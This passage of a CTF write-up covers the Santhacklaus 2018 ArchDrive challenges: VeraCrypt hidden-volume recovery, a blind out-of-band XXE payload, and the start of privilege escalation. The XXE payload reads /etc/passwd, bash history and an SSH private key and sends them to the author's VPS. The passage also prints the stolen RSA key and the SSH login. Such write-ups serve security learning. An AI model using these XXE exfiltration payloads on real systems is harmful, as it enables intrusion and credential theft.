Veracrypt)</li></ul><h3 id=decrypting-and-mounting>Decrypting and mounting</h3><p>There are 3 keys:</p><ul><li>7Rex-Mazda0-hover1-Quid</li><li>Gourd-crown2-gao4-warp2 - Take On Me</li><li>0twain-Mao0-flash-6Goof-Gent</li></ul><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_1.png data-srcset="/lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_1.png, /lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_1.png 1.5x, /lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_1.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_1.png title=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_1.png></p><ul><li>documents -> 0twain-Mao0-flash-6Goof-Gent</li><li>media -> 7Rex-Mazda0-hover1-Quid</li></ul><p>A little tip about forensic, when you&rsquo;re mounting something: Make a copy of your volume, and work and that copy, it will prevent all unannounced change.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ lsblk
+</span></span><span class=line><span class=cl>NAME             MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINT
+</span></span><span class=line><span class=cl>loop0              7:0    <span class=m>0</span>    10M  <span class=m>0</span> loop  
+</span></span><span class=line><span class=cl>└─veracrypt1     254:4    <span class=m>0</span>   9,8M  <span class=m>0</span> dm    /mnt/veracrypt1
+</span></span><span class=line><span class=cl>loop1              7:1    <span class=m>0</span>    30M  <span class=m>0</span> loop  
+</span></span><span class=line><span class=cl>└─veracrypt2     254:5    <span class=m>0</span>  29,8M  <span class=m>0</span> dm    /mnt/veracrypt2
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ sudo dd <span class=k>if</span><span class=o>=</span>/dev/mapper/veracrypt1 <span class=nv>of</span><span class=o>=</span>clear_document.dmp <span class=nv>bs</span><span class=o>=</span>4M
+</span></span><span class=line><span class=cl>$ sudo dd <span class=k>if</span><span class=o>=</span>/dev/mapper/veracrypt2 <span class=nv>of</span><span class=o>=</span>clear_media.dmp <span class=nv>bs</span><span class=o>=</span>4M
+</span></span></code></pre></td></tr></table></div></div><p>After copying, I&rsquo;m using <code>testdisk</code> to browse into.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo testdisk /path/to/document.dmp 
+</span></span><span class=line><span class=cl>Proceed -&gt; None -&gt; Advanced -&gt; Undelete
+</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_2.png data-srcset="/lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_2.png, /lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_2.png 1.5x, /lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_2.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_2.png title=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_2.png></p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_3.png data-srcset="/lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_3.png, /lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_3.png 1.5x, /lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_3.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_3.png title=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_3.png></p><p>Using <code>testdisk</code> allows me to find erased files. The MP3 in <code>documents</code> containers is not really helpful.</p><h3 id=hidden-volume>Hidden volume</h3><p>I remind me something, when I tried to learn how veracrypt work: hidden volume.</p><blockquote><p><a href=https://www.veracrypt.fr/en/Hidden%20Volume.html target=_blank rel="noopener noreffer">https://www.veracrypt.fr/en/Hidden%20Volume.html</a></p></blockquote><p>There is one more key in the <code>password.txt</code> file:</p><blockquote><p>Gourd-crown2-gao4-warp2 - Take On Me</p></blockquote><p>And in the <code>media</code> container, there is a MP3 file called:</p><blockquote><p>-rwxr-xr-x 0 0 7080168 19-Dec-2018 10:28 a.ha_-_TakeOnMe.mp3</p></blockquote><p>Let&rsquo;s try to decrypt the <code>media</code> container with the given key and the MP3 as keyfiles:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cp clear_media.dmp hidden_media.dmp 
+</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://media.giphy.com/media/l3q2GZaeJ4v24D7P2/giphy.gif data-srcset="https://media.giphy.com/media/l3q2GZaeJ4v24D7P2/giphy.gif, https://media.giphy.com/media/l3q2GZaeJ4v24D7P2/giphy.gif 1.5x, https://media.giphy.com/media/l3q2GZaeJ4v24D7P2/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/l3q2GZaeJ4v24D7P2/giphy.gif title=https://media.giphy.com/media/l3q2GZaeJ4v24D7P2/giphy.gif></p><p>WTF, it worked! You&rsquo;re really crazy guys, first time seeing this in a CTF! :D</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo dd <span class=k>if</span><span class=o>=</span>/dev/mapper/veracrypt3 <span class=nv>of</span><span class=o>=</span>clear_media_hidden.dmp <span class=nv>bs</span><span class=o>=</span>4M
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ sudo testdisk clear_media_hidden.dmp 
+</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_4.png data-srcset="/lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_4.png, /lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_4.png 1.5x, /lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_4.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_4.png title=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_4.png></p><h3 id=flag-2>Flag</h3><p>In <code>FLAG.TXT</code>:</p><blockquote><p>IMTLD{I_h4v3_N0th1ng_T0_h1d3}</p></blockquote><h2 id=archdrive-43>ArchDrive 4/3</h2><table><thead><tr><th>Event</th><th>Challenge</th><th>Category</th><th>Points</th><th>Solves</th></tr></thead><tbody><tr><td>Santhacklaus</td><td>ArchDrive 4/3</td><td>Web</td><td>700</td><td>8</td></tr></tbody></table><h3 id=statement-3>Statement</h3><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive4.png data-srcset="/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive4.png, /lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive4.png 1.5x, /lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive4.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive4.png title=/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive4.png></p><h3 id=state-of-the-art-3>State of the art</h3><p>After recovering the erased zip archive in the hidden container, we obtain two files:</p><ul><li>README.md</li><li>ticket.xml</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ unzip Dark_Lottery_ticket_d2e383e8600daf6dc31c2436aefd3f58.zip 
+</span></span><span class=line><span class=cl>Archive:  Dark_Lottery_ticket_d2e383e8600daf6dc31c2436aefd3f58.zip
+</span></span><span class=line><span class=cl>  inflating: ticket.xml              
+</span></span><span class=line><span class=cl>  inflating: README.md
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ cat README.md
+</span></span><span class=line><span class=cl><span class=c1>### This ticket is the property of `Dark Lottery` ###</span>
+</span></span><span class=line><span class=cl>If you are not the buyer and <span class=k>if</span> you found / stole this ticket, you must delete it immediately.
+</span></span><span class=line><span class=cl>This ticket is unique, <span class=k>do</span> not share it.
+</span></span><span class=line><span class=cl>Remember to use it at your own risk.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Thank you <span class=k>for</span> your purchase !
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>--- scgz54b2lftqkkvn.onion ---
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ cat ticket.xml                      
+</span></span><span class=line><span class=cl>&lt;ticket&gt;
+</span></span><span class=line><span class=cl>    &lt;number&gt;14453&lt;/number&gt;
+</span></span><span class=line><span class=cl>    &lt;status&gt;valid&lt;/status&gt;
+</span></span><span class=line><span class=cl>    &lt;date&gt;20/12/2018&lt;/date&gt;
+</span></span><span class=line><span class=cl>    &lt;type&gt;premium&lt;/date&gt;
+</span></span><span class=line><span class=cl>&lt;/ticket&gt;
+</span></span></code></pre></td></tr></table></div></div><h3 id=tor-browsing-buying-drugs>Tor browsing (BUYING DRUGS)</h3><p>What happens on this onion website:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive4_1.png data-srcset="/lib/images/writeups/2018_santhacklaus/archdrive/archdrive4_1.png, /lib/images/writeups/2018_santhacklaus/archdrive/archdrive4_1.png 1.5x, /lib/images/writeups/2018_santhacklaus/archdrive/archdrive4_1.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive4_1.png title=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive4_1.png></p><p>It&rsquo;s impossible to buy ticket, it&rsquo;s SOLD OUT :&rsquo;(
+But if you got one, you can play:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive4_2.png data-srcset="/lib/images/writeups/2018_santhacklaus/archdrive/archdrive4_2.png, /lib/images/writeups/2018_santhacklaus/archdrive/archdrive4_2.png 1.5x, /lib/images/writeups/2018_santhacklaus/archdrive/archdrive4_2.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive4_2.png title=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive4_2.png></p><p>Ooooook, our ticket doesn&rsquo;t work. Here is what we got:</p><ul><li>XML file</li><li>Upload form</li><li>Same output</li></ul><p>It looks to be a blind XXE, or XXE OOB (Out of band): <a href=https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/ target=_blank rel="noopener noreffer">https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/</a></p><h3 id=xxe-oob>XXE OOB</h3><p>I will not use <code>ngrok</code> trick, because I got my VPS now. Before starting, <strong>ironforge</strong> is my VPS and <strong>miniverse</strong> is my laptop.</p><p>I craft a new ticket:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>miniverse $ cat ticket.xml 
+</span></span><span class=line><span class=cl>&lt;?xml <span class=nv>version</span><span class=o>=</span><span class=s2>&#34;1.0&#34;</span> <span class=nv>encoding</span><span class=o>=</span><span class=s2>&#34;UTF-8&#34;</span> <span class=nv>standalone</span><span class=o>=</span><span class=s2>&#34;yes&#34;</span>?&gt;
+</span></span><span class=line><span class=cl>&lt;!DOCTYPE number <span class=o>[</span> &lt;!ENTITY % pe SYSTEM <span class=s2>&#34;http://51.75.29.170:12345/bite.dtd&#34;</span>&gt; %pe<span class=p>;</span> %param1<span class=p>;</span> <span class=o>]</span>&gt;
+</span></span><span class=line><span class=cl>&lt;ticket&gt;
+</span></span><span class=line><span class=cl>    &lt;number&gt;<span class=p>&amp;</span>external<span class=p>;</span>&lt;/number&gt;
+</span></span><span class=line><span class=cl>    &lt;status&gt;valid&lt;/status&gt;
+</span></span><span class=line><span class=cl>    &lt;date&gt;20/12/2018&lt;/date&gt;
+</span></span><span class=line><span class=cl>    &lt;type&gt;premium&lt;/date&gt;
+</span></span><span class=line><span class=cl>&lt;/ticket&gt;
+</span></span></code></pre></td></tr></table></div></div><p>The IP address is my VPS (where <a href=https://ctf.maki.bzh target=_blank rel="noopener noreffer">https://ctf.maki.bzh</a> is hosted). This XML code, will grab the dtd file on my VPS, then:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ironforge $ cat bite.dtd
+</span></span><span class=line><span class=cl>&lt;!ENTITY % stuff SYSTEM <span class=s2>&#34;php://filter/convert.base64-encode/resource=/etc/passwd&#34;</span>&gt;
+</span></span><span class=line><span class=cl>&lt;!ENTITY % param1 <span class=s2>&#34;&lt;!ENTITY external SYSTEM &#39;http://51.75.29.170:12346/a.php?data=%stuff;&#39;&gt;&#34;</span>&gt;
+</span></span></code></pre></td></tr></table></div></div><p>The first XML will grab <code>bite.dtd</code> file, which send the content of <code>/etc/passwd</code> (base64 encoded) on the port <strong>12346</strong> of my VPS:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive4_3.gif data-srcset="/lib/images/writeups/2018_santhacklaus/archdrive/archdrive4_3.gif, /lib/images/writeups/2018_santhacklaus/archdrive/archdrive4_3.gif 1.5x, /lib/images/writeups/2018_santhacklaus/archdrive/archdrive4_3.gif 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive4_3.gif title=/lib/images/writeups/2018_santhacklaus/archdrive/archdrive4_3.gif></p><p>It works!</p><h3 id=file-extraction-1>File extraction</h3><p>In the <code>/etc/passwd</code> file, only one user got <code>/bin/bash</code> shell: <strong>root</strong>, what does it contain?</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ironforge $ cat bite.dtd
+</span></span><span class=line><span class=cl>&lt;!ENTITY % stuff SYSTEM <span class=s2>&#34;php://filter/convert.base64-encode/resource=/root/.bash_history&#34;</span>&gt;
+</span></span><span class=line><span class=cl>&lt;!ENTITY % param1 <span class=s2>&#34;&lt;!ENTITY external SYSTEM &#39;http://51.75.29.170:12346/a.php?data=%stuff;&#39;&gt;&#34;</span>&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>ironforge $ nc -lvp <span class=m>12346</span>
+</span></span><span class=line><span class=cl>Listening on <span class=o>[</span>0.0.0.0<span class=o>]</span> <span class=o>(</span>family 0, port 12346<span class=o>)</span>
+</span></span><span class=line><span class=cl>Connection from 113.ip-51-75-202.eu <span class=m>49966</span> received!
+</span></span><span class=line><span class=cl>GET /a.php?data<span class=o>=</span>bHMgLWxhIC9ob21lL2RhcmtfbG90dGVyeS8uc3NoL2lkX3JzYSAKY2F0IC9ob21lL2RhcmtfbG90dGVyeS8uc3NoL2lkX3JzYSAK HTTP/1.0
+</span></span><span class=line><span class=cl>Host: 51.75.29.170:12346
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>ironforge $ <span class=nb>echo</span> -n <span class=s1>&#39;bHMgLWxhIC9ob21lL2RhcmtfbG90dGVyeS8uc3NoL2lkX3JzYSAKY2F0IC9ob21lL2RhcmtfbG90dGVyeS8uc3NoL2lkX3JzYSAK&#39;</span> <span class=p>|</span> base64 -d
+</span></span><span class=line><span class=cl>ls -la /home/dark_lottery/.ssh/id_rsa 
+</span></span><span class=line><span class=cl>cat /home/dark_lottery/.ssh/id_rsa
+</span></span></code></pre></td></tr></table></div></div><h3 id=ssh-connection>SSH connection</h3><p>Ok, ssh keys, it start to smells good :D
+Following the same process, I extract:</p><ul><li>/home/dark_lottery/.ssh/id_rsa</li><li>/etc/ssh/sshd_config</li></ul><blockquote><p>/home/dark_lottery/.ssh/id_rsa</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>-----BEGIN RSA PRIVATE KEY-----
+</span></span><span class=line><span class=cl>MIICXQIBAAKBgQC3e6s3ZeRV/lgTltFgmVLB/LBYtzRBSpQUEt/1g/MsMidRhdBw
+</span></span><span class=line><span class=cl>W0kDlgchsVHL6kGt26JtHVr04MdFSeCUHiSJVuuqDiEPae+98l4LOWWg2dXwKsIv
+</span></span><span class=line><span class=cl>x6qDobCyGNi7HzmkxNTh+NxLq+aIsjk/gw38HtNkZAqwokySDcZhgwHFawIDAQAB
+</span></span><span class=line><span class=cl>AoGAQqB/vfAcCDYB2assgL1sVdDiYHS2Xvcr6lYoSUkO5n+X03yaAhLD4q96C3wO
+</span></span><span class=line><span class=cl>TdPU4cMdqi28t6tf8QMwr9h6P1+M7CDTsyBQbR7bvm88yzGNBuE9P3oBiKu24+x0
+</span></span><span class=line><span class=cl>lPL1TORpHxGOersUz3eH2+hdnGs3xDYNSk8RoUY6ckCv3AECQQDbdwhuvDo+cnkN
+</span></span><span class=line><span class=cl>xupfdvSRTfXH05fosfvim6/yvw0ZeyxyAzXE5/KclpNCXzW70JrVI4huXjk5TD7l
+</span></span><span class=line><span class=cl>R019nJprAkEA1gcw48pAjFSc6oTexR1ayHQYGFGSx7PvXi+VJHAyFTXP4+l+pk72
+</span></span><span class=line><span class=cl>qFlrT4tYMiZqbCws9qAthpsTBnauspBBAQJBAMWOwn2EXV3niEc5n7NuDrxalHxc
+</span></span><span class=line><span class=cl>YivrRFZ6VYnMJ8ufUKQVdaqaLZB+D3O451L5dteU0/SeRx7oHtogNIZ1mZ8CQAYp
+</span></span><span class=line><span class=cl>mNfGOAuSWB5MixmD2dxRs2vn1WEYpjjBB/tPm7GOphi63WGufl2kjXlx2q0+++t3
+</span></span><span class=line><span class=cl>bif/vq/UgTy7aBZOHwECQQC4jty8EX0KdvylXIRzhCK7XvHze+GXHFptaB1wf+Wr
+</span></span><span class=line><span class=cl>LAKwqo3/gOiPe8w5CRUWuDfuy04a81OBEF3Gv2pyVctg
+</span></span><span class=line><span class=cl>-----END RSA PRIVATE KEY-----
+</span></span></code></pre></td></tr></table></div></div><blockquote><p>/etc/ssh/sshd_config</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>### SSH configuration file ###
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># General
+</span></span><span class=line><span class=cl>Port 2020
+</span></span><span class=line><span class=cl>Protocol 2
+</span></span><span class=line><span class=cl>AcceptEnv LANG LC_*
+</span></span><span class=line><span class=cl>[...]
+</span></span></code></pre></td></tr></table></div></div><p>We got a port and a private key :D</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>miniverse $ chmod <span class=m>600</span> dark_lottery_priv.key
+</span></span><span class=line><span class=cl>miniverse $ ssh -i dark_lottery_priv.key dark_lottery@51.75.202.113 -p <span class=m>2020</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    ___           _        __       _   _
+</span></span><span class=line><span class=cl>   /   <span class=se>\_</span>_ _ _ __<span class=p>|</span> <span class=p>|</span> __   / /  ___ <span class=p>|</span> <span class=p>|</span>_<span class=p>|</span> <span class=p>|</span>_ ___ _ __ _   _
+</span></span><span class=line><span class=cl>  / /<span class=se>\ </span>/ _<span class=sb>`</span> <span class=p>|</span> <span class=s1>&#39;__| |/ /  / /  / _ \| __| __/ _ \ &#39;</span>__<span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span>
+</span></span><span class=line><span class=cl> / /_// <span class=o>(</span>_<span class=p>|</span> <span class=p>|</span> <span class=p>|</span>  <span class=p>|</span>   &lt;  / /__<span class=p>|</span> <span class=o>(</span>_<span class=o>)</span> <span class=p>|</span> <span class=p>|</span>_<span class=p>|</span> <span class=o>||</span>  __/ <span class=p>|</span>  <span class=p>|</span> <span class=p>|</span>_<span class=p>|</span> <span class=p>|</span>
+</span></span><span class=line><span class=cl>/___,<span class=err>&#39;</span> <span class=se>\_</span>_,_<span class=p>|</span>_<span class=p>|</span>  <span class=p>|</span>_<span class=p>|</span><span class=se>\_\ \_</span>___/<span class=se>\_</span>__/ <span class=se>\_</span>_<span class=p>|</span><span class=se>\_</span>_<span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span>   <span class=se>\_</span>_, <span class=p>|</span>
+</span></span><span class=line><span class=cl>                                                      <span class=p>|</span>___/
+</span></span><span class=line><span class=cl>Last login: Fri Dec <span class=m>21</span> 18:28:07 <span class=m>2018</span> from 77.206.71.218
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>The programs included with the Debian GNU/Linux system are free software<span class=p>;</span>
+</span></span><span class=line><span class=cl>the exact distribution terms <span class=k>for</span> each program are described in the
+</span></span><span class=line><span class=cl>individual files in /usr/share/doc/*/copyright.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span class=line><span class=cl>permitted by applicable law.
+</span></span><span class=line><span class=cl>dark_lottery@9db68003fdde:~$ ls
+</span></span><span class=line><span class=cl>flag.txt
+</span></span></code></pre></td></tr></table></div></div><h3 id=flag-3>Flag</h3><blockquote><p>IMTLD{Wh4t_4_H4rD_ch4lL3nge}</p></blockquote><h2 id=archdrive-53>ArchDrive 5/3</h2><table><thead><tr><th>Event</th><th>Challenge</th><th>Category</th><th>Points</th><th>Solves</th></tr></thead><tbody><tr><td>Santhacklaus</td><td>ArchDrive 5/3</td><td>App-script</td><td>300</td><td>8</td></tr></tbody></table><h3 id=statement-4>Statement</h3><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive5.png data-srcset="/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive5.png, /lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive5.png 1.5x, /lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive5.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive5.png title=/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive5.png></p><h3 id=state-of-the-art-4>State of the art</h3><p>Let&rsquo;s privesc. As I said in NetRunner 3/3, there are few ways to privesc:</p><ul><li>sudo misconfigured</li><li>crontab or services running as privileged user</li><li>suid binary or script to exploit</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo -l
+</span></span><span class=line><span class=cl>-bash: sudo: <span class=nb>command</span> not found
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ ps aux<span class=p>|</span> grep root
+</span></span><span class=line><span class=cl>root         <span class=m>1</span>  0.0  0.0  <span class=m>19708</span>  <span class=m>3200</span> ?        Ss   Dec21   0:00 /bin/bash ./start.sh
+</span></span><span class=line><span class=cl>root         <span class=m>8</span>  0.0  0.0  <span class=m>69952</span>  <span class=m>5756</span> ?        S    Dec21   0:00 /usr/sbin/sshd -D
+</span></span><span class=line><span class=cl>root         <span class=m>9</span>  0.0  0.0  <span class=m>29740</span>  <span class=m>2808</span> ?        S    Dec21   0:00 cron -f
+</span></span><span class=line><span class=cl>root        <span class=m>97</span>  0.0  0.0  <span class=m>19952</span>  <span class=m>3656</span> pts/2    Ss+  Dec21   0:00 bash
+</span></span><span class=line><span class=cl>root     <span class=m>13454</span>  0.0  0.0  <span class=m>69952</span>  <span class=m>6504</span> ?        Ss   12:20   0:00 sshd: dark_lottery <span class=o>[</span>priv<span class=o>]</span>
+</span></span><span class=line><span class=cl>dark_lo+ <span class=m>13539</span>  0.0  0.0  <span class=m>11112</span>   <span class=m>988</span> pts/0    S+   12:26   0:00 grep root
+</span></span></code></pre></td></tr></table></div></div><p>Crontab as root, nice, let&rsquo;s find the cron script:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ls -la /
+</span></span><span class=line><span class=cl>total <span class=m>84</span>
+</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>1</span> root root <span class=m>4096</span> Dec <span class=m>21</span> 18:26 .
+</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>1</span> root root <span class=m>4096</span> Dec <span class=m>21</span> 18:26 ..
+</span></span><span class=line><span class=cl>-rwxr-xr-x   <span class=m>1</span> root root    <span class=m>0</span> Dec <span class=m>21</span> 18:26 .dockerenv
+</span></span><span class=line><span class=cl>-rwxrwxr--   <span class=m>1</span> root root  <span class=m>147</span> Dec <span class=m>20</span> 18:24 backup.sh
+</span></span><span class=line><span class=cl>dr--r-----   <span class=m>1</span> root root <span class=m>4096</span> Dec <span class=m>22</span> 12:27 backups
+</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>1</span> root root <span class=m>4096</span> Dec <span class=m>20</span> 18:26 bin
